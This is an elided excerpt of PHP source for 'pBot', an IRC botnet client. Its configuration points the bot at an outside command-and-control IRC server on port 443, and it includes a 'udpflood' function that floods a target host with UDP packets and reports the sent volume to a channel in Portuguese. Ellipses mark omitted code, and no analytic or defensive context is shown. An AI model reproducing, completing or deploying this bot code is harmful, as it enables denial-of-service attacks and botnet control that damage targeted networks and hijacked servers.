...
class pBot
{
var $config = array("server"=>"irc.silverlords.org",
                     "port"=>443,
                     "pass"=>"", //
                     "prefix"=>"B0T",
                     "maxrand"=>7,
 ...
 function set_nick()
 {
  ...
  function udpflood($host,$packetsize,$time) {
	$this->privmsg($this->config['chan'],"[\2pacotou\2]: host $host tempo $time tamanho $packetsize ");
	$packet = "";
	...
	$vel = round($vel);
	$env = round($env);
	$this->privmsg($this->config['chan'],"[\pacotou\2]: Enviou: $env MB na velocidade : $vel MB/s ");
}
